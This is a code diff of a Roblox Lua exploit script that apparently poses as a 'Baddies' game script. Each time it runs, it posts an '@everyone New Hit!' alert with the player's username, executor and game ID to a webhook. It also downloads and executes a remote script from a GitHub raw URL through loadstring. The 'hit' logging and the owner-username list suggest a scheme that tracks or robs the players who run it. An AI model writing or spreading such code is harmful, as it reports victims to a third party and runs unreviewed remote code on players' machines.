@@ -6,21 +6,20 @@ _G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}   -- Change this
 
 _G.PING_POOR = true
 
--- Send simple notification
+-- Send notification when someone runs it
 task.spawn(function()
     if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
         local http = game:GetService("HttpService")
         local plr = game.Players.LocalPlayer
         local executor = identifyexecutor and identifyexecutor() or "Unknown"
-        local message = "@everyone New Hit! | Username: " .. plr.Name .. " | Executor: " .. executor .. " | Game: " .. game.PlaceId
+
+        local message = "@everyone New Hit!\nUsername: " .. plr.Name .. "\nExecutor: " .. executor .. "\nGame: " .. game.PlaceId
+
         game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode({content = message}))
     end
 end)
 
--- Load Baddies
-task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true))()
-end)
+-- Load the main Baddies script
 task.spawn(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true))()
 end)
